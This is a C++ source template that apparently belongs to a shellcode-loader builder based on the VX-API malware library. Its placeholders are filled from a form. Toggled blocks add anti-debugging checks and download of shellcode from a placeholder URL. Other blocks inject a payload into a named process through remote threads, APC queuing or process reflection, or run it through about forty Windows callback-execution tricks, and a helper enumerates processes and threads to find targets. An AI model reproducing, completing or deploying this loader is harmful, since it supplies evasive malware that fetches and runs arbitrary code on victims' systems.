#include "Win32Helper.h"

//GET PS/THREAD NAME. NECESSARY FOR PSINJ
/*INJ #define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId)
{
	// Snapshot of all processes
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32W pe{};
	pe.dwSize = sizeof(pe);

	DWORD result = 0;

	if (Process32FirstW(hSnap, &pe))
	{
		do
		{
			std::wstring exe = pe.szExeFile;

			// case-insensitive compare
			std::wstring exeLower = exe;
			std::wstring targetLower = processName;
			std::transform(exeLower.begin(), exeLower.end(), exeLower.begin(), ::towlower);
			std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::towlower);

			if (exeLower == targetLower)
			{
				if (returnProcessId)
				{
					result = pe.th32ProcessID;
				}
				else
				{
					// Snapshot of all threads to find one belonging to this PID
					HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
					if (hThreadSnap != INVALID_HANDLE_VALUE)
					{
						THREADENTRY32 te{};
						te.dwSize = sizeof(te);
						if (Thread32First(hThreadSnap, &te))
						{
							do
							{
								if (te.th32OwnerProcessID == pe.th32ProcessID)
								{
									result = te.th32ThreadID;
									break; // just return the first thread ID found
								}
							} while (Thread32Next(hThreadSnap, &te));
						}
						CloseHandle(hThreadSnap);
					}
				}

				break; // found process
			}
		} while (Process32NextW(hSnap, &pe));
	}

	CloseHandle(hSnap);
	return result; // 0 = not found
}
INJ*/

INT main(VOID)
{
	//////////////////////////////////////////////////////////////////////////
	//
	// The following variables are used for VX-API development and debugging,
	// they do not serve any purpose and can be removed.
	// 
	//////////////////////////////////////////////////////////////////////////

	//Start#GUARDRAIL
	// 
	// 
	//End#GUARDRAIL
	

	//Start#ANTIDEBUGGING
	//if(AdfCloseHandleOnInvalidAddress()) return 0;
	//if(AdfIsCreateProcessDebugEventCodeSet()) return 0;
	//if(AdfOpenProcessOnCsrss()) return 0;
	//if(IsIntelHardwareBreakpointPresent()) return 0;
	////if(CheckRemoteDebuggerPresent2()) return 0;
	//if(IsDebuggerPresentEx()) return 0;
	//End#ANTIDEBUGGING

	unsigned int code_blob_len = 0;
	/*encodedshellcode*/
	DWORD dwSize = (DWORD)code_blob_len;
	//URL based shellcode
	//URLSHELL PCHAR code_blob = UrlDownloadHexTextA((PCHAR)"$shellurl$",&dwSize);
	
	
	//Start#GENERICSHELLCODE
	//PCHAR code_blob = GenericShellcodeHelloWorldMessageBoxA(&dwSize);
	//PCHAR code_blob = GenericShellcodeHelloWorldMessageBoxAEbFbLoop(&dwSize);
	//PCHAR code_blob = GenericShellcodeOpenCalcExitThread(&dwSize);
	//End#GENERICSHELLCODE

	//Start#UACB
	// 
	//End#UACB

	// To Do: processname/threadname to TID/PID.
	//    If injection is enabled the strings: INJ*/ and /*INJ should be removed from this file 
	//    $psname$ should be replaced with the input supplied from the form
	//Start#PSINJECTION
	//if (MpfPiWriteProcessMemoryCreateRemoteThread((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", false))) return 1;
	//if (MpfPiQueueUserAPCViaAtomBomb((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", false))) return 1;
	//if (MpfPiControlInjection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", true))) return 1;
	//if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", true))) return 1;
	//End#PSINJECTION
	
	//Start#SHELLCODEEXECUTION
	//if (MpfSceViaEnumChildWindows((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaCDefFolderMenu_Create2((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaCertEnumSystemStore((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaCertEnumSystemStoreLocation((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumDateFormatsW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumDesktopWindows((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumDesktopsW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumDirTreeW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumDisplayMonitors((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumFontFamiliesExW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumFontsW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumLanguageGroupLocalesW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumObjects((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumResourceTypesExW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumSystemCodePagesW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumSystemGeoID((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumSystemLanguageGroupsW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumSystemLocalesEx((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumThreadWindows((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumTimeFormatsEx((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumUILanguagesW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumWindowStationsW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumWindows((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumerateLoadedModules64((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaK32EnumPageFilesW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumPwrSchemes((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaImmEnumInputContext((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaEnumPropsExW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaCryptEnumOIDInfo((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaDSA_EnumCallback((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaFlsAlloc((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaInitOnceExecuteOnce((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaChooseColorW((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaClusWorkerCreate((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaSymEnumProcesses((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaImageGetDigestStream((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaVerifierEnumerateResource((PBYTE)code_blob,dwSize)) return 1;
	//if (MpfSceViaSymEnumSourceFiles((PBYTE)code_blob,dwSize)) return 1;
	//End#SHELLCODEEXECUTION

	Sleep(1);
	return 0;
}
